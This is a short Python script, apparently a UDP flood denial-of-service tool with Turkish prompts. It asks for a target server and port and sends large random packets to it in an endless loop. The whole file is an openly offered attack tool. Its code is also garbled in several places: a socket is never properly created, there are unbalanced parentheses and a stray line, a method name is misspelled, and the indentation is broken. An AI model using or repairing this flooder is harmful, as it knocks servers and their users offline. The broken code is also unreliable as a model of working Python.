import socket, random,time, sys
def Dos():
    host = input('server domain: ')
    ip = socket.gethostbyname(host)
    port= int(input('server port : '))
    s = socket.SOCK_DGRAM)
    bytes = random._urandom(64900)
    print()
    print('-') * 60)
    print()
    time.sleep(1)
    sent = 0
    while True:
        try:
            s.sendto(bytes,(ip,port))
            sent = sent + 1
            print('Bot gönderildi Made by Santez ')
            (sent, host, port))
            except KeyboardInterrupt:
                print('/ninterruption')

return


print(open('usage', 'r').read())
while True:
    start =  input('>>>')
    if start.lower().startswith('s'):
        Dos()
        elif start.lower().startsw,th('q'):
            sys.exit()
            else:
                print('Q Çıkmak , S başlat')
